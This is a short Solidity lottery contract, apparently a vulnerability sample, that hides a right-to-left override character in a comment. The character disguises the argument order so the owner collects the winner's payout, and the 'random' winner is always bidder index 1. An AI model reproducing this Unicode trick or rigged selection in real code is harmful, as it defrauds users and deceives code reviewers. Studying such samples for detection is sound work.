pragma solidity 0.5.10;

/**
 * Users can make bets and a winner is selected randomly
 */
contract Lottery {
    mapping(uint => address payable) bidders;
    uint bidderIdx = 0;
    address payable o;

    constructor() public {o = msg.sender;}

    function doPayout(address payable _owner,address payable _winner, uint _ownerPercentage) internal {
        uint amount = address(this).balance;
        uint ownerAmount = amount * _ownerPercentage / 100;
        uint winnerAmount = amount - ownerAmount;
        _owner.transfer(ownerAmount);
        _winner.transfer(winnerAmount);
    }
    
    /**
     * The comment in this function contains a RTLO character
     * that will make it look like owner's address is the first
     * argument. In reality, it is the second argument
     */
    function determineWinner() public {
        require(msg.sender == o);
        address payable w = randomlySelectWinner();
        doPayout(/* owner's address ‮/* sserdda s'renniw */ w ,o /*
            /* percentage of owner's cut */, 10);
    }
    
    function randomlySelectWinner() view internal returns(address payable) {
        uint winnerIdx = 1;
        return bidders[winnerIdx];
    }

    function bet() public payable {
        require(msg.value == 1 ether);
        bidders[bidderIdx] = msg.sender;
        bidderIdx++;
    }
}